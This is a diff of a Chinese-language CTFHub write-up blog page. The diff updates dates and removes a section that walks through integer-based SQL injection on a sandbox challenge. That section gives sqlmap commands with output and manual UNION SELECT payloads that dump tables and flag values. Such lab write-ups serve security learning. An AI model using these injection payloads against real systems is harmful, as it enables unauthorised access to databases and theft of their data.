@@ -43,7 +43,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
 <meta property="article:published_time" content="2023-09-11T12:08:35.000Z">
-<meta property="article:modified_time" content="2023-09-12T09:27:27.895Z">
+<meta property="article:modified_time" content="2023-09-27T16:11:24.347Z">
 <meta property="article:author" content="weiwei">
 <meta property="article:tag" content="-CTFHub">
 <meta name="twitter:card" content="summary">
@@ -1758,7 +1758,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     debug: "env",
     cdn: {"js":{"app":"/js/app.js","parallax":"/js/plugins/parallax.js","rightMenu":"/js/plugins/rightMenu.js","rightMenus":"/js/plugins/rightMenus.js","sites":"/js/plugins/tags/sites.js","friends":"/js/plugins/tags/friends.js","contributors":"/js/plugins/tags/contributors.js","search":"/js/search/hexo.js"},"css":{"style":"/css/style.css"}},
     default: {"avatar":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/image/2659360.svg"},
-    lastupdate: new Date(1694540958982),
+    lastupdate: new Date(1696349754885),
     sidebar: {
       for_page: ["blogger","category","tagcloud","donate"],
       for_post: ["toc"],
@@ -2626,60 +2626,6 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </tr>
 </tbody></table>
 <hr>
-<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="一、整数型注入"><a href="#一、整数型注入" class="headerlink" title="一、整数型注入"></a>一、整数型注入</h3><h4 id="方法一SQL注入"><a href="#方法一SQL注入" class="headerlink" title="方法一	SQL注入"></a>方法一	SQL注入</h4><p>1、SQLmap爆出数据库信息</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://challenge-f6ea6271f47a5c21.sandbox.ctfhub.com:10080/?id=1&quot; --current-db</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[16:29:30] [INFO] fetching current database</span><br><span class="line">current database: &#x27;sqli&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>2、SQLmap列出指定数据库所有的表名:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://challenge-f6ea6271f47a5c21.sandbox.ctfhub.com:10080/?id=1&quot; -D sqli --tables</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[16:30:07] [INFO] retrieved: &#x27;news&#x27;</span><br><span class="line">[16:30:08] [INFO] retrieved: &#x27;flag&#x27;</span><br><span class="line">Database: sqli</span><br><span class="line">[2 tables]</span><br><span class="line">+------+</span><br><span class="line">| flag |</span><br><span class="line">| news |</span><br><span class="line">+------+</span><br></pre></td></tr></table></figure>
-
-<p>3、SQLmap 列出指定表名的所有列名</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://challenge-f6ea6271f47a5c21.sandbox.ctfhub.com:10080/?id=1&quot; -D sqli  -T flag  --columns</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Database: sqli</span><br><span class="line">Table: flag</span><br><span class="line">[1 column]</span><br><span class="line">+--------+--------------+</span><br><span class="line">| Column | Type         |</span><br><span class="line">+--------+--------------+</span><br><span class="line">| flag   | varchar(100) |</span><br><span class="line">+--------+--------------+</span><br></pre></td></tr></table></figure>
-
-<p>4、SQLmap 打印输出表名指定列名字段的值数据</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://challenge-f6ea6271f47a5c21.sandbox.ctfhub.com:10080/?id=1&quot; -D sqli  -T flag  -C flag --dump</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Database: sqli</span><br><span class="line">Table: flag</span><br><span class="line">[1 entry]</span><br><span class="line">+----------------------------------+</span><br><span class="line">| flag                             |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| ctfhub&#123;c738d407d82740b4fa840800&#125; |</span><br><span class="line">+----------------------------------+</span><br></pre></td></tr></table></figure>
-
-
-
-<p>####方法二	手动注入</p>
-<p>1、使用order by n 语句查询字段数</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 order by 2</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from news where id=1 order by 2</span><br><span class="line">ID: 1</span><br><span class="line">Data: ctfhub</span><br></pre></td></tr></table></figure>
-
-<p>2、使用union联合查询检测信息回显位置</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1,2</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from news where id=-1 union select 1,2</span><br><span class="line">ID: 1</span><br><span class="line">Data: 2</span><br></pre></td></tr></table></figure>
-
-<p>3、获取当前数据库名</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1,database()</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from news where id=-1 union select 1,database()</span><br><span class="line">ID: 1</span><br><span class="line">Data: sqli</span><br></pre></td></tr></table></figure>
-
-<p>4、查询数据库sqli表名</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1,group_concat(table_name)from information_schema.tables where table_schema=&#x27;sqli&#x27;</span><br><span class="line">-1 union select 1,table_name from information_schema.tables where table_schema=&#x27;sqli&#x27;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from news where id=-1 union select 1,group_concat(table_name)from information_schema.tables where table_schema=&#x27;sqli&#x27;</span><br><span class="line">ID: 1</span><br><span class="line">Data: news,flag</span><br></pre></td></tr></table></figure>
-
-<p>5、获取flag列所有字段名</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#x27;sqli&#x27; and table_name=&#x27;flag&#x27;</span><br><span class="line">-1 union select 1,column_name from information_schema.columns where table_schema=&#x27;sqli&#x27; and table_name=&#x27;flag&#x27;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from news where id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#x27;sqli&#x27; and table_name=&#x27;flag&#x27;</span><br><span class="line">ID: 1</span><br><span class="line">Data: flag</span><br></pre></td></tr></table></figure>
-
-<p>6、获取指定数据库的表的列的内容</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1,group_concat(flag) from sqli.flag</span><br><span class="line">-1 union select 1,flag from sqli.flag</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1 union select * from news where id=-1 union select 1,group_concat(flag) from sqli.flag</span><br><span class="line">ID: 1</span><br><span class="line">Data: ctfhub&#123;9e78719b9f362a4058891f1f&#125;</span><br></pre></td></tr></table></figure>
-
-<hr>
 
   </div>
   
@@ -2704,10 +2650,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateModified" datetime="2023-09-12T17:27:27+08:00">
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2023-09-28T00:11:24+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Sep 12, 2023</p>
+    <p>更新于：Sep 28, 2023</p>
   </a>
 </div>
 
@@ -2789,7 +2735,8 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class='prev' href='/2023/09/12/CTFHub-4/'>
           <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>CTFHub-4</p>
-          <p class='content'>SQL注入二、报错注入方法一	SQLmap注入1python sqlmap.py -u &quot;http://challenge-edf7e3fef5ffee34.sandbox.ctfhu...</p>
+          <p class='content'>SQL注入一、整数型注入方法一	SQL注入1、SQLmap爆出数据库信息
+1python sqlmap.py -u &quot;http://challenge-f6ea6271f47a5c21...</p>
         </a>
       
       
@@ -2859,7 +2806,7 @@ Basic ...</p>
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%93%8D%E5%BA%94%E5%8C%85%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="toc-text">响应包源代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%95%B4%E6%95%B0%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-text">一、整数型注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80SQL%E6%B3%A8%E5%85%A5"><span class="toc-text">方法一	SQL注入</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%93%8D%E5%BA%94%E5%8C%85%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="toc-text">响应包源代码</span></a></li></ol>
     </div>
   </section>
 
@@ -3689,7 +3636,7 @@ window.matchMedia('(prefers-color-scheme: light)').addListener(darkModelListener
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Artemis","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"weiwei","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"最是人间留不住，朱颜辞镜花辞树。"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Artemis"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2023/09/11/CTFHub-3/","name":"CTFHub-3"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Artemis","url":"http://example.com/","keywords":null,"description":"最是人间留不住，朱颜辞镜花辞树。","author":{"@type":"Person","name":"weiwei","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"最是人间留不住，朱颜辞镜花辞树。"},"publisher":{"@type":"Organization","name":"Artemis","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"CTFHub-3","description":"最是人间留不住，朱颜辞镜花辞树。","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2023/09/11/CTFHub-3/"},"author":{"@type":"Person","name":"weiwei","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Artemis","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2023/09/11/CTFHub-3/","wordCount":0,"datePublished":"2023-09-11T12:08:35.000Z","dateModified":"2023-09-12T09:27:27.895Z","keywords":"-CTFHub","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Artemis","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"weiwei","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"最是人间留不住，朱颜辞镜花辞树。"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Artemis"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2023/09/11/CTFHub-3/","name":"CTFHub-3"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Artemis","url":"http://example.com/","keywords":null,"description":"最是人间留不住，朱颜辞镜花辞树。","author":{"@type":"Person","name":"weiwei","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"最是人间留不住，朱颜辞镜花辞树。"},"publisher":{"@type":"Organization","name":"Artemis","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"CTFHub-3","description":"最是人间留不住，朱颜辞镜花辞树。","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2023/09/11/CTFHub-3/"},"author":{"@type":"Person","name":"weiwei","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Artemis","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2023/09/11/CTFHub-3/","wordCount":0,"datePublished":"2023-09-11T12:08:35.000Z","dateModified":"2023-09-27T16:11:24.347Z","keywords":"-CTFHub","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
